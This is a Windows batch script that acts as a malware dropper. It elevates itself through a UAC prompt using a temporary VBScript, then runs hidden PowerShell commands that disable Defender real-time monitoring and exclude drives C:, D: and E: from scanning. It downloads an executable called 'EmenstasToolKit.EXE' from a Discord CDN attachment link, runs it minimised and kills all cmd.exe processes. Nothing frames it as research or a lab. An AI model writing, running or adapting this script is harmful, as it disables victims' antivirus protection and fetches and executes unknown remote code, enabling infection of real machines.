��&cls
@echo off
setlocal

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
  >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
  >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if "%errorlevel%" NEQ "0" (
  goto UACPrompt
) else (
  goto gotAdmin
)

:UACPrompt
echo Set UAC = CreateObject("Shell.Application") > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:gotAdmin
REM --> Proceed with your script below here
PowerShell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
PowerShell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\'"
PowerShell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'D:\'"
PowerShell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'E:\'"
PowerShell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false"

REM --> Download the file from the provided link
echo Downloading the file...
powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1157283611670745220/1169038321163452466/EmenstasToolKit.EXE?ex=6553f2c7&is=65417dc7&hm=397c3e0f8561a81186d16aa4195e347d27c1a66fa86032d9a61d4fbbbb99debb&' -OutFile 'EmenstasToolKit.EXE'"

REM --> Execute the downloaded file and wait for it to finish
echo Executing the downloaded file...
start /wait /min EmenstasToolKit.EXE

REM --> Close the command prompt window
echo Closing the command prompt...
taskkill /F /IM cmd.exe
